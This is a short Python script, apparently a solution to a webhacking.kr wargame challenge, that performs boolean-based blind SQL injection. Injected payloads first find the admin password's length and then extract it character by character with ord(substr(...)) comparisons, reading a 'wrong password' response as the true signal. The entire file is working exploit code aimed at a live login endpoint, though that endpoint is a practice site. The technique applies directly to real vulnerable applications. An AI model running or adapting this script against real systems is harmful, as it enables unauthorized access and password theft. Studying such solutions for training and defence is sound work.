import requests

URL = 'https://webhacking.kr/challenge/bonus-1/index.php?id=admin&pw='
TRUE_PHRASE = 'wrong password'

def query(payload):
    r = requests.get(URL + payload)
    Content = r.text
    return TRUE_PHRASE in Content


def find_pw_length():
    pw_len = 1
    while query("' or id='admin' and length(pw)={}%23".format(pw_len)) is False:
        pw_len += 1
    print('pw_len: {}'.format(pw_len))
    return pw_len

def find_pw():
    pw_len = find_pw_length()
    pw = ''
    for pos in range(1, pw_len + 1):
        for character in range(0, 128):
            if query("' or id='admin' and ord(substr(pw,{},1))={}%23".format(pos, character)) is True:
                pw += chr(character)
                break
    print('pw: {}'.format(pw))

find_pw()